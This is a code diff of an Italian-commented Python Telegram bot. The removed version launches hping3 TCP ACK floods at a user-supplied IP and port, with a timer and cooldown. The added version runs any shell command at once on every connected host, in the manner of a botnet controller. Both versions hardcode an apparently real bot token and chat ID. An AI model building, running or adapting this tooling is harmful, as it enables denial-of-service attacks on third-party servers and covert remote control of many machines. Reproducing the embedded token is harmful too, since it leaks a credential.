@@ -1,249 +1,93 @@
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, Filters
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
 import subprocess
 import os
 import signal
 import socket
-import psutil
-import threading
-import time
-import json
 
 # ================= CONFIG =================
-TOKEN = "8386952835:AAEJ8hXDq0NRUje_5eChujRZhBwz0Vw2CLI"
-MASTER_ID = 5699538596
-AUTHORIZED_IDS_FILE = "authorized_ids.json"
-MONITOR_INTERVAL = 1
-HPING_DURATION = 130
-HPING_COOLDOWN = 30
+TOKEN = "8386952835:AAEJ8hXDq0NRUje_5eChu-jRZhBwz0Vw2CLI"  # inserisci il tuo token valido
+AUTHORIZED_ID = 5699538596  # tuo chat_id numerico
 # =========================================
 
-# Caricamento ID autorizzati
-if os.path.exists(AUTHORIZED_IDS_FILE):
-    with open(AUTHORIZED_IDS_FILE, "r") as f:
-        AUTHORIZED_IDS = json.load(f)
-else:
-    AUTHORIZED_IDS = [MASTER_ID]
-    with open(AUTHORIZED_IDS_FILE, "w") as f:
-        json.dump(AUTHORIZED_IDS, f)
-
+process = None
+LAST_CMD = None
 HOSTNAME = socket.gethostname()
-processes = {}
-monitor_threads = {}
-awaiting_ip = {}  # stato attesa IP per ogni utente
 
-# ---------- UTILS ----------
-def save_ids():
-    with open(AUTHORIZED_IDS_FILE, "w") as f:
-        json.dump(AUTHORIZED_IDS, f)
-
-def get_cpu_status():
-    cpu_total = psutil.cpu_percent(interval=0.1)
-    return f"💻 CPU totale: {cpu_total}%"
-
-def is_authorized(user_id):
-    return user_id in AUTHORIZED_IDS
-
-def is_master(user_id):
-    return user_id == MASTER_ID
-
-def build_main_keyboard():
-    keyboard = [
-        [InlineKeyboardButton("🟢 START", callback_data="start")],
-        [InlineKeyboardButton("💻 CPU", callback_data="cpu")],
-        [InlineKeyboardButton("⛔ STOP", callback_data="stop")],
-        [InlineKeyboardButton("ℹ️ STATUS", callback_data="status")],
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-# ---------- MASTER COMMANDS ----------
-def addid(update: Update, context: CallbackContext):
-    if not is_master(update.effective_user.id):
+# ----- /start -----
+def start(update, context):
+    if update.effective_user.id != AUTHORIZED_ID:
         return
-    if len(context.args) != 1:
-        update.message.reply_text("Uso: /addid <id>")
-        return
-    try:
-        new_id = int(context.args[0])
-        if new_id in AUTHORIZED_IDS:
-            update.message.reply_text("ID già presente")
-            return
-        AUTHORIZED_IDS.append(new_id)
-        save_ids()
-        update.message.reply_text(f"✅ ID {new_id} aggiunto")
-    except ValueError:
-        update.message.reply_text("ID non valido")
+    update.message.reply_text(
+        f"🤖 Bot attivo su: {HOSTNAME}\n"
+        "Usa /run ALL <comando> per eseguirlo su tutte le VNC attive.\n"
+        "Puoi usare /stop per fermare e /status per verificare lo stato."
+    )
 
-def removeid(update: Update, context: CallbackContext):
-    if not is_master(update.effective_user.id):
-        return
-    if len(context.args) != 1:
-        update.message.reply_text("Uso: /removeid <id>")
-        return
-    try:
-        rem_id = int(context.args[0])
-        if rem_id == MASTER_ID:
-            update.message.reply_text("Non puoi rimuovere il Master ID")
-            return
-        if rem_id not in AUTHORIZED_IDS:
-            update.message.reply_text("ID non presente")
-            return
-        AUTHORIZED_IDS.remove(rem_id)
-        save_ids()
-        update.message.reply_text(f"❌ ID {rem_id} rimosso")
-    except ValueError:
-        update.message.reply_text("ID non valido")
-
-# ---------- CALLBACK HANDLER ----------
-def button_handler(update: Update, context: CallbackContext):
-    query = update.callback_query
-    user_id = query.from_user.id
-    query.answer()
-
-    if not is_authorized(user_id):
-        query.edit_message_text("❌ Non autorizzato")
+# ----- /run -----
+def run_command(update, context):
+    global process, LAST_CMD
+    if update.effective_user.id != AUTHORIZED_ID:
         return
 
-    if query.data == "cpu":
-        show_cpu(user_id, query, context)
-    elif query.data == "stop":
-        stop_hping(user_id, query)
-    elif query.data == "status":
-        show_status(user_id, query)
-    elif query.data == "start":
-        chat_id = query.message.chat_id
-        awaiting_ip[user_id] = True
-        context.bot.send_message(chat_id, "📌 Invia l'IP e la PORTA nel formato: example 127.0.0.1:53")
-
-# ---------- CPU MONITOR ----------
-def show_cpu(user_id, query, context):
-    chat_id = query.message.chat_id
-    msg = context.bot.send_message(chat_id=chat_id, text=get_cpu_status())
-    stop_event = threading.Event()
-    key = f"cpu_{user_id}"
-    monitor_threads[key] = stop_event
-
-    def monitor():
-        while not stop_event.is_set():
-            try:
-                context.bot.edit_message_text(chat_id=msg.chat_id, message_id=msg.message_id,
-                                              text=get_cpu_status())
-            except:
-                break
-            time.sleep(MONITOR_INTERVAL)
-    t = threading.Thread(target=monitor, daemon=True)
-    t.start()
-
-# ---------- HPING COMMAND ----------
-def start_hping(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if not is_authorized(user_id):
-        return
     text = update.message.text.strip()
-    if ":" not in text:
-        update.message.reply_text("Formato errato, usa ip:porta")
+    if not text.startswith("/run"):
         return
-    ip, port = text.split(":", 1)
-    port = port.strip()
-    key = str(user_id)
-    now = time.time()
-    if key in processes:
-        p_info = processes[key]
-        if p_info.get('proc') and p_info['proc'].poll() is None:
-            update.message.reply_text("⚠️ Processo già in esecuzione")
-            return
-        if 'cooldown' in p_info and now < p_info['cooldown']:
-            remaining = int(p_info['cooldown'] - now)
-            update.message.reply_text(f"⏱️ Cooldown attivo: {remaining}s")
-            return
 
-    cmd = f"hping3 {ip} -A -p {port} -d 64 -i u1"
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
-    end_time = now + HPING_DURATION
-    processes[key] = {'proc': proc, 'end_time': end_time, 'coldown': now + HPING_DURATION + HPING_COOLDOWN}
-    msg = update.message.reply_text(f"⏳ Avvio su {ip}:{port} per {HPING_DURATION}s")
+    parts = text.split(maxsplit=2)
+    if len(parts) < 3:
+        update.message.reply_text("⚠️ Formato corretto: /run ALL <comando>")
+        return
 
-    def countdown():
-        while True:
-            remaining = int(end_time - time.time())
-            if remaining <= 0:
-                update.message.reply_text(f"✅ Tempo finito. Cooldown di {HPING_COOLDOWN}s iniziato.")
-                break
-            try:
-                context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
-                                              text=f"⏳ in esecuzione: {remaining}s")
-            except:
-                pass
-            time.sleep(1)
-    t = threading.Thread(target=countdown, daemon=True)
-    t.start()
+    target, cmd = parts[1], parts[2]
+    if target != "ALL" and target != HOSTNAME:
+        return  # comando destinato ad altri nodi
 
-# ---------- STOP / STATUS ----------
-def stop_hping(user_id, query):
-    key = str(user_id)
-    if key in processes and processes[key].get('proc') and processes[key]['proc'].poll() is None:
-        os.killpg(os.getpgid(processes[key]['proc'].pid), signal.SIGTERM)
-        processes[key]['proc'] = None
-        query.edit_message_text("⛔ Processo fermato")
+    LAST_CMD = cmd
+    if process is None or process.poll() is not None:
+        process = subprocess.Popen(
+            LAST_CMD,
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid
+        )
+        update.message.reply_text(f"[{HOSTNAME}] ▶️ AVVIATO\nComando: {LAST_CMD}")
     else:
-        query.edit_message_text("ℹ️ Nessun processo attivo")
+        update.message.reply_text(f"[{HOSTNAME}] ⚠️ Già in esecuzione")
 
-def show_status(user_id, query):
-    key = str(user_id)
-    now = time.time()
-    if key in processes:
-        p_info = processes[key]
-        proc_active = p_info.get('proc') and p_info['proc'].poll() is None
-        remaining = int(p_info['end_time'] - now) if proc_active else 0
-        cooldown_remaining = int(p_info['cooldown'] - now) if 'cooldown' in p_info and now < p_info['cooldown'] else 0
-        status_msg = "🟢 ATTIVO" if proc_active else "🔴 FERMO"
-        msg = f"Stato: {status_msg}\n"
-        if proc_active:
-            msg += f"Tempo rimanente: {remaining}s\n"
-        if cooldown_remaining:
-            msg += f"⏱️ Cooldown: {cooldown_remaining}s"
-        query.edit_message_text(msg)
+# ----- /stop -----
+def stop_command(update, context):
+    global process
+    if update.effective_user.id != AUTHORIZED_ID:
+        return
+
+    if process and process.poll() is None:
+        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+        process = None
+        update.message.reply_text(f"[{HOSTNAME}] ⛔ FERMATO")
     else:
-        query.edit_message_text("🔴 Nessun processo avviato")
+        update.message.reply_text(f"[{HOSTNAME}] ℹ️ Nessun processo attivo")
 
-# ---------- START COMMAND ----------
-def start(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if not is_authorized(user_id):
+# ----- /status -----
+def status_command(update, context):
+    global process, LAST_CMD
+    if update.effective_user.id != AUTHORIZED_ID:
         return
-    update.message.reply_text(f"🤖 Bot attivo su {HOSTNAME}", reply_markup=build_main_keyboard())
 
-# ---------- IP:PORT HANDLER ----------
-def ipport_handler(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if not is_authorized(user_id):
-        return
-    if not awaiting_ip.get(user_id, False):
-        return  # ignora messaggi casuali
-    text = update.message.text.strip()
-    if ":" not in text:
-        update.message.reply_text("Formato errato, usa ip:porta")
-        return
-    start_hping(update, context)
-    awaiting_ip[user_id] = False
+    if process and process.poll() is None:
+        update.message.reply_text(f"[{HOSTNAME}] 🟢 ATTIVO\nComando: {LAST_CMD}")
+    else:
+        update.message.reply_text(f"[{HOSTNAME}] 🔴 FERMO")
 
-# ---------- MAIN ----------
+# ----- Main -----
 def main():
-    updater = Updater(TOKEN, use_context=True)
+    updater = Updater(TOKEN)
     dp = updater.dispatcher
 
-    # Master commands
-    dp.add_handler(CommandHandler("addid", addid, pass_args=True))
-    dp.add_handler(CommandHandler("removeid", removeid, pass_args=True))
-
-    # Start command
     dp.add_handler(CommandHandler("start", start))
-
-    # Handler per catturare messaggi ip:porta senza usare comando
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, ipport_handler))
-
-    # Inline buttons
-    dp.add_handler(CallbackQueryHandler(button_handler))
+    dp.add_handler(CommandHandler("run", run_command))
+    dp.add_handler(CommandHandler("stop", stop_command))
+    dp.add_handler(CommandHandler("status", status_command))
 
     updater.start_polling()
     updater.idle()
